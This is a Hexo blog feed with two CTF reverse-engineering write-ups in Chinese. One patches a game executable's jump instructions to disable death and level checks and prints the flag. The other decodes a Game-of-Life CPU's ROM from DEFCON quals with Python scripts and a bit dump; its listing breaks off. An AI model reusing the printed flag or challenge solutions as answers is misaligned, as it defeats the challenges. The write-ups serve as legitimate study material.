<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>能打一辈子CTF吗？</title>
  <icon>https://www.gravatar.com/avatar/260de78781b3355b5fcbb52d09a7a2a9</icon>
  <subtitle>呜呜什么时候能成为厉害的会二进制的大人啊</subtitle>
  <link href="https://github.com/xyy9233/xyy9233.github.io.git/atom.xml" rel="self"/>
  
  <link href="https://github.com/xyy9233/xyy9233.github.io.git/"/>
  <updated>2024-09-16T08:25:40.587Z</updated>
  <id>https://github.com/xyy9233/xyy9233.github.io.git/</id>
  
  <author>
    <name>wind_9233</name>
    <email>1768765226@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DEFCON quals | Rev  ncHEVjuw.txt</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/NKgame/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/NKgame/</id>
    <published>2024-09-14T16:00:00.000Z</published>
    <updated>2024-09-16T08:25:40.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NKgame-reverse"><a href="#NKgame-reverse" class="headerlink" title="NKgame reverse"></a>NKgame reverse</h1><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li>   逆向分析game.exe二进制代码的主要逻辑结构和重要数据。</li></ol><p>1）查找主要函数和流程：使用反汇编工具打开game.exe，查找程序的入口点，然后分析主要函数和流程。</p><p>先扔DIE——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps1.jpg" alt="img"> </p><p>扔IDA x32里——</p><p>分析game.exe程序流程——</p><p>整个程序共分为了4个关卡，四个关卡对应四个地图，玩家需要操控主角通过这四个关卡，然后会回到最开始的关卡，在这个关卡的地图的下方的海边找到最后的NPC并与之对话就可以得到最后的flag。</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps2.jpg" alt="img"> </p><p>2）理解关卡切换条件：找到关卡切换的条件判断语句。</p><p>对于这四个关卡，每个关卡的通关条件是要击杀足够多的怪物，只有击杀的怪物数量足够后，才能进入下一个关卡。</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps3.jpg" alt="img"> </p><p>3）识别主角和怪物的关键数据：查找和理解主角和怪物的血量、移速、攻击范围、攻击力等关键数据的使用方式。</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps4.jpg" alt="img"> </p><ol start="2"><li>   修改game.exe二进制代码， 在实验报告中说明代码修改的具体过程。</li></ol><p>1）打开游戏进行体验。体验后发现，角色死亡后，屏幕上显示“died”,因此在字符串中搜索，来找到游戏人物死亡判定的代码</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps5.jpg" alt="img"><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps6.jpg" alt="img"> </p><p>跳转到程序代码中，将jb改成jmp，就实现了不死</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps7.jpg" alt="img"> </p><p>2）继续闯关，进入下一关时却给出如下提示：You need to kill enough monsters!</p><p>再次利用ida pro搜索字符串You need to kill enough monsters!</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps8.jpg" alt="img"> </p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps9.jpg" alt="img"> </p><p>跳转到程序代码中，将jz改成jmp，就可以直接开始下一关。</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps10.jpg" alt="img"> </p><p>3）继续游戏——</p><h2 id="二、实验结果"><a href="#二、实验结果" class="headerlink" title="二、实验结果"></a>二、实验结果</h2><p>运行游戏，未再出现相关失败提示，最后通关并得到flag:</p><p>(第一次不小心跳过flag了，在flag这里下个断点）</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps11.jpg" alt="img"> </p><p>flag{a2fdkd80xo}</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps12.jpg" alt="img"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NKgame-reverse&quot;&gt;&lt;a href=&quot;#NKgame-reverse&quot; class=&quot;headerlink&quot; title=&quot;NKgame reverse&quot;&gt;&lt;/a&gt;NKgame reverse&lt;/h1&gt;&lt;h2 id=&quot;实验步骤&quot;&gt;&lt;a href=&quot;#实</summary>
      
    
    
    
    
    <category term="RE GAME CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE-GAME-CTF/"/>
    
  </entry>
  
  <entry>
    <title>DEFCON quals | Rev  ncHEVjuw.txt</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/DEFCONquals_Rev_ncHEVjuw/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/DEFCONquals_Rev_ncHEVjuw/</id>
    <published>2024-09-14T16:00:00.000Z</published>
    <updated>2024-09-16T08:18:20.727Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DEFCON-quals-Rev-ncHEVjuw-txt"><a href="#DEFCON-quals-Rev-ncHEVjuw-txt" class="headerlink" title="DEFCON quals | Rev  ncHEVjuw.txt"></a>DEFCON quals | Rev  ncHEVjuw.txt</h1><p>“电路是怎么构成CPU的？你可以这么想象，现在假想你已经控制了电路，可以任意的描述电路就可以把电路做出来，然后从这一步开始，你想要做一个CPU出来，忽略一些具体的细节，只关注最关键的部分，这                                                      个过程能不能描述出来——这样吧，不如我直接给你个题，你可以判断下这块够不够了。”</p><p>丁佬说用Golly打开，Golly存储格式为.rle，修改文件后缀，打开是一个CPU（小鳄鱼）</p><p>感觉思路大概是通过CPU的运行，通过程序的底层运行，还原程序，得到flag——</p><p>主要还是考CPU组成</p><hr><p>尝试运行，一闪一闪的——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20220336.png" alt="屏幕截图 2024-09-13 220336"></p><p>拉近再看，ROM，ROM EXPANDS THIS WAY&lt;—</p><p>ROM（Read Only Memory）只读存储器</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20220503.png" alt="img"></p><p>ON——开关</p><p>ARG i MODE  操作数的寻址方式</p><p>ARG i VAL 实际操作数的值</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20221052.png" alt="img"></p><p>OpCode</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20222507.png" alt="img"></p><p>ALU 的输入包括数据和指令码。ALU 的输出是其执行运算的结果。</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20223002.png" alt="img"></p><p>PC寄存器，存储当前指令的地址。当CPU执行一条指令后，它会自动增加PC的值，以指向下一条要执行的指令的地址。这个增加操作被称为 <strong>INC（increment，递增）</strong>。EIP</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20223058.png" alt="img"></p><p>RAM（随机存取存储器）是用于存储数据和指令的存储器单元。</p><p>RAM 16 ADDR：表示RAM的地址宽度为16位，最多可以寻址65536个存储单元。</p><p>READ QUEUE读取队列——指令预取和 数据预取</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20223407.png" alt="img"></p><p>找到一个类似的CPU——一模一样、</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20240916153134760.png" alt="image-20240916153134760"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20240916153207060.png" alt="image-20240916153207060"></p><p>整个指令集包括11条RISC指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MNZ [test] [value] [dest] – Move if not zero; sets [dest] to [value] if [test] is not zero.</span><br><span class="line">MLZ [test] [value] [dest] – Move if less than zero; sets [dest] to [value] if [test] is less than zero.</span><br><span class="line">ADD [val1] [val2] [dest] – Add; adds [val1] to [val2] and stores the result in [dest].</span><br><span class="line">SUB [val1] [val2] [dest] – Subtract; subtracts [val2] from [val1] and stores the result in [dest].</span><br><span class="line">AND [val1] [val2] [dest] – Bitwise AND; bitwise ANDs together [val1] and [val2] and stores the result in [dest].</span><br><span class="line">OR [val1] [val2] [dest] – Bitwise OR; bitwise ORs together [val1] and [val2] and stores the result in [dest].</span><br><span class="line">XOR [val1] [val2] [dest] – Bitwise XOR; bitwise XORs together [val1] and [val2] and stores the result in [dest].</span><br><span class="line">ANT [val1] [val2] [dest] – Bitwise AND-NOT; bitwise ANDs together [val1] and (NOT [val2]) and stores the result in [dest].</span><br><span class="line">SL [val1] [val2] [dest] – Shift left; shifts [val1] left by [val2] bits and stores the result in [dest].</span><br><span class="line">SRL [val1] [val2] [dest] – Shift right (logical); shifts [val1] right by [val2] bits and stores the result in [dest]. Doesn&#x27;t preserve sign.</span><br><span class="line">SRA [val1] [val2] [dest] – Shift right (arithmetic); shifts [val1] right by [val2] bits and stores the result in [dest], while preserving sign.</span><br></pre></td></tr></table></figure><p>指令支持4种寻址方式，在汇编语言中用特定前缀区分：</p><ul><li>立即寻址：无前缀</li><li>直接寻址：前缀A</li><li>间接寻址：前缀B</li><li>双重间接寻址：前缀C</li></ul><hr><p>ok懂了，那就先把ROM的信息拿出来——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/1111.png" alt="1111"></p><p>这是一个1</p><p>对应这个大图——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/png1.png" alt="png1"></p><p>标注0和1——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/annotated_png1.png" alt="annotated_png1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">image = cv2.imread(<span class="string">&#x27;png1.png&#x27;</span>)</span><br><span class="line">black_template = cv2.imread(<span class="string">&#x27;0000.png&#x27;</span>, <span class="number">0</span>) </span><br><span class="line">white_template = cv2.imread(<span class="string">&#x27;1111.png&#x27;</span>, <span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">h_template, w_template = black_template.shape</span><br><span class="line">image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">img_height, img_width = image_gray.shape</span><br><span class="line"></span><br><span class="line">matrix = np.full((img_height // h_template, img_width // w_template), <span class="string">&#x27;0&#x27;</span>, dtype=<span class="built_in">str</span>)</span><br><span class="line">res_black = cv2.matchTemplate(image_gray, black_template, cv2.TM_CCOEFF_NORMED)</span><br><span class="line">threshold = <span class="number">0.8</span></span><br><span class="line">loc_black = np.where(res_black &gt;= threshold)</span><br><span class="line"></span><br><span class="line">res_white = cv2.matchTemplate(image_gray, white_template, cv2.TM_CCOEFF_NORMED)</span><br><span class="line">loc_white = np.where(res_white &gt;= threshold)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> <span class="built_in">zip</span>(*loc_black[::-<span class="number">1</span>]):</span><br><span class="line">    x, y = pt</span><br><span class="line">    matrix[y // h_template, x // w_template] = <span class="string">&#x27;0&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> <span class="built_in">zip</span>(*loc_white[::-<span class="number">1</span>]):</span><br><span class="line">    x, y = pt</span><br><span class="line">    matrix[y // h_template, x // w_template] = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;matrix_output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> matrix:</span><br><span class="line">        f.write(<span class="string">&#x27;&#x27;</span>.join(row) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>根据延申方向和ROM结构，后四位是opcode，前18位为addr3，19-18*2为addr2，18*2+1到18*3为addr1，18*3+4 &#x3D; 57行，</p><p>所以从右往左一列一列、从下往上、4.18.18.18读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000001010110000000000001011000011111111111111110001</span><br><span class="line">000000000000000100000000000000000000000000000000000000110</span><br><span class="line">000000000000000100001100101011100110011111111111111110001</span><br><span class="line">000000000000000110000111000110110100011111111111111110001</span><br><span class="line">000000000000001000001010111101011010011111111111111110001</span><br><span class="line">000000000000001010001100011010000110011111111111111110001</span><br><span class="line">000000000000001100000001110100111110011111111111111110001</span><br><span class="line">000000000000001110000110100010011110011111111111111110001</span><br><span class="line">000000000000010000000101111000110110011111111111111110001</span><br><span class="line">000000000000010010000001001111110100011111111111111110001</span><br><span class="line">000000000000010100000111101110011110011111111111111110001</span><br><span class="line">000000000000010110000010111001000010011111111111111110001</span><br><span class="line">000000000000011000001000110010110010011111111111111110001</span><br><span class="line">000000000000011010000111001111001110011111111111111110001</span><br><span class="line">000000000000011100000010010100101010011111111111111110001</span><br><span class="line">000000000000011110000011110010010100011111111111111110001</span><br><span class="line">000000000000100000001010111110100000011111111111111110001</span><br><span class="line">000000000000100010000100000101100110011111111111111110001</span><br><span class="line">000000000000100100000110000100000100011111111111111110001</span><br><span class="line">000000000000100110001011000110100100011111111111111110001</span><br><span class="line">000000000000101000001000000011100110011111111111111110001</span><br><span class="line">000000000000101010000011011110111000011111111111111110001</span><br><span class="line">000000000000101100001011001000010010011111111111111110001</span><br><span class="line">000000000000101110001010111001000110011111111111111110001</span><br><span class="line">000000000000110000000110000110001010011111111111111110001</span><br><span class="line">000000000000110010000011111000000000011111111111111110001</span><br><span class="line">000000000000110100001101000000001100011111111111111110001</span><br><span class="line">000000000000110110000111100011110110011111111111111110001</span><br><span class="line">000000000000111000000011001010001110011111111111111110001</span><br><span class="line">000000000000111010000000111000011100011111111111111110001</span><br><span class="line">000000000000111100001011000101100010011111111111111110001</span><br><span class="line">000000000000111110001100001101110110011111111111111110001</span><br><span class="line">000000000001000000001000000001110100011111111111111110001</span><br><span class="line">000000000001000010000010100000110010011111111111111110001</span><br><span class="line">000000000001000100000111100111010010011111111111111110001</span><br><span class="line">000000000001000110001011101001110110011111111111111110001</span><br><span class="line">000000000001001000001011100101110100011111111111111110001</span><br><span class="line">000000000001001010000110111000001100011111111111111110001</span><br><span class="line">000000000001001100001011010010100110011111111111111110001</span><br><span class="line">000000000001001110000000000000000000011111111111111110001</span><br><span class="line">000000000001001110010010101110101010100000000000000010110</span><br><span class="line">000000000000000100100000000000000100100000000001001110011</span><br><span class="line">000000000001001110011001001001111100100000000000000010110</span><br><span class="line">000000000000000110100000000000000110100000000001001110011</span><br><span class="line">000000000001001110010100111111010110100000000000000010110</span><br><span class="line">000000000000001000100000000000001000100000000001001110011</span><br><span class="line">000000000001001110010010011101010010100000000000000010110</span><br><span class="line">000000000000001010100000000000001010100000000001001110011</span><br><span class="line">000000000001001110011111111000111110100000000000000010110</span><br><span class="line">000000000000001100100000000000001100100000000001001110011</span><br><span class="line">000000000001001110011000100101010100100000000000000010110</span><br><span class="line">000000000000001110100000000000001110100000000001001110011</span><br><span class="line">000000000001001110011011111011011010100000000000000010110</span><br><span class="line">000000000000010000100000000000010000100000000001001110011</span><br><span class="line">000000000001001110011111010011110010100000000000000010110</span><br><span class="line">000000000000010010100000000000010010100000000001001110011</span><br><span class="line">000000000001001110011001110001000000100000000000000010110</span><br><span class="line">000000000000010100100000000000010100100000000001001110011</span><br><span class="line">000000000001001110011100111100111010100000000000000010110</span><br><span class="line">000000000000010110100000000000010110100000000001001110011</span><br><span class="line">000000000001001110010110110110110110100000000000000010110</span><br><span class="line">000000000000011000100000000000011000100000000001001110011</span><br><span class="line">000000000001001110011001010010100010100000000000000010110</span><br><span class="line">000000000000011010100000000000011010100000000001001110011</span><br><span class="line">000000000001001110011100011000101100100000000000000010110</span><br><span class="line">000000000000011100100000000000011100100000000001001110011</span><br><span class="line">000000000001001110011101110101001000100000000000000010110</span><br><span class="line">000000000000011110100000000000011110100000000001001110011</span><br><span class="line">000000000001001110010101000001000010100000000000000010110</span><br><span class="line">000000000000100000100000000000100000100000000001001110011</span><br><span class="line">000000000001001110011010001000011110100000000000000010110</span><br><span class="line">000000000000100010100000000000100010100000000001001110011</span><br><span class="line">000000000001001110011000000111101100100000000000000010110</span><br><span class="line">000000000000100100100000000000100100100000000001001110011</span><br><span class="line">000000000001001110010101001001001100100000000000000010110</span><br><span class="line">000000000000100110100000000000100110100000000001001110011</span><br><span class="line">000000000001001110010110000110001010100000000000000010110</span><br><span class="line">000000000000101000100000000000101000100000000001001110011</span><br><span class="line">000000000001001110011101100010000100100000000000000010110</span><br><span class="line">000000000000101010100000000000101010100000000001001110011</span><br><span class="line">000000000001001110010101001011011110100000000000000010110</span><br><span class="line">000000000000101100100000000000101100100000000001001110011</span><br><span class="line">000000000001001110010100111100011110100000000000000010110</span><br><span class="line">000000000000101110100000000000101110100000000001001110011</span><br><span class="line">000000000001001110011000001001000000100000000000000010110</span><br><span class="line">000000000000110000100000000000110000100000000001001110011</span><br><span class="line">000000000001001110011101111011100100100000000000000010110</span><br><span class="line">000000000000110010100000000000110010100000000001001110011</span><br><span class="line">000000000001001110010011000011100100100000000000000010110</span><br><span class="line">000000000000110100100000000000110100100000000001001110011</span><br><span class="line">000000000001001110011001100111111010100000000000000010110</span><br><span class="line">000000000000110110100000000000110110100000000001001110011</span><br><span class="line">000000000001001110011101001101000100100000000000000010110</span><br><span class="line">000000000000111000100000000000111000100000000001001110011</span><br><span class="line">000000000001001110011110111011110100100000000000000010110</span><br><span class="line">000000000000111010100000000000111010100000000001001110011</span><br><span class="line">000000000001001110010101001001111010100000000000000010110</span><br><span class="line">000000000000111100100000000000111100100000000001001110011</span><br><span class="line">000000000001001110010010010001111010100000000000000010110</span><br><span class="line">000000000000111110100000000000111110100000000001001110011</span><br><span class="line">000000000001001110010110000101110000100000000000000010110</span><br><span class="line">000000000001000000100000000001000000100000000001001110011</span><br><span class="line">000000000001001110011100100100111000100000000000000010110</span><br><span class="line">000000000001000010100000000001000010100000000001001110011</span><br><span class="line">000000000001001110011001101010111110100000000000000010110</span><br><span class="line">000000000001000100100000000001000100100000000001001110011</span><br><span class="line">000000000001001110010101101101111010100000000000000010110</span><br><span class="line">000000000001000110100000000001000110100000000001001110011</span><br><span class="line">000000000001001110010101101001001100100000000000000010110</span><br><span class="line">000000000001001000100000000001001000100000000001001110011</span><br><span class="line">000000000001001110011000111011000110100000000000000010110</span><br><span class="line">000000000001001010100000000001001010100000000001001110011</span><br><span class="line">000000000001001110010101010110001110100000000000000010110</span><br><span class="line">000000000001001100100000000001001100100000000001001110011</span><br><span class="line">000000000000000000011111111111111100011111111111111110001</span><br><span class="line">000000000000000000000000000000000000000000000000000000001</span><br><span class="line">000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>根据</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-15%20005952.png" alt="屏幕截图 2024-09-15 005952"></p><p>和上面的规则，hex2asm.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bitstring <span class="keyword">import</span> BitArray</span><br><span class="line"></span><br><span class="line">opcodes = &#123;<span class="string">&#x27;0000&#x27;</span>: <span class="string">&#x27;MNZ&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0001&#x27;</span>: <span class="string">&#x27;MLZ&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0010&#x27;</span>: <span class="string">&#x27;ADD&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0011&#x27;</span>: <span class="string">&#x27;SUB&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0100&#x27;</span>: <span class="string">&#x27;AND&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0101&#x27;</span>: <span class="string">&#x27;OR&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0110&#x27;</span>: <span class="string">&#x27;XOR&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0111&#x27;</span>: <span class="string">&#x27;ANT&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;1000&#x27;</span>: <span class="string">&#x27;SL&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;1001&#x27;</span>: <span class="string">&#x27;SRL&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;1010&#x27;</span>: <span class="string">&#x27;SRA&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">modes = &#123;<span class="string">&#x27;00&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;01&#x27;</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;10&#x27;</span>: <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;11&#x27;</span>: <span class="string">&#x27;C&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">code</span>):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    count = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> code[::<span class="number">1</span>]:</span><br><span class="line">        opcode = opcodes[l[-<span class="number">4</span>:]]</span><br><span class="line">        arg1 = l[<span class="number">18</span>*<span class="number">2</span>-<span class="number">1</span>:-<span class="number">4</span>]</span><br><span class="line">        arg2 = l[<span class="number">17</span>:<span class="number">18</span>*<span class="number">2</span>-<span class="number">1</span>]</span><br><span class="line">        arg3 = l[:<span class="number">17</span>]</span><br><span class="line">        mode1 = modes[arg1[:<span class="number">2</span>]]</span><br><span class="line">        arg1 = <span class="built_in">str</span>(BitArray(<span class="built_in">bin</span>=arg1[<span class="number">2</span>:]).<span class="built_in">int</span>)</span><br><span class="line">        mode2 = modes[arg2[:<span class="number">2</span>]]</span><br><span class="line">        arg2 = <span class="built_in">str</span>(BitArray(<span class="built_in">bin</span>=arg2[<span class="number">2</span>:]).uint) //这里转无符号数</span><br><span class="line">        mode3 = modes[arg3[:<span class="number">2</span>]]</span><br><span class="line">        arg3 = <span class="built_in">str</span>(BitArray(<span class="built_in">bin</span>=arg3[<span class="number">2</span>:]).uint)</span><br><span class="line">        out += <span class="built_in">str</span>(count) + <span class="string">&#x27;. &#x27;</span> + opcode + <span class="string">&#x27; &#x27;</span> + mode1 + arg1 + <span class="string">&#x27; &#x27;</span> + mode2 + arg2 + <span class="string">&#x27; &#x27;</span> + mode3 + arg3 +<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">code = []</span><br><span class="line">asm = parse(code)</span><br><span class="line"><span class="built_in">print</span>(asm)</span><br></pre></td></tr></table></figure><p>这里，value值不考虑负数，所以以无符号数转化</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 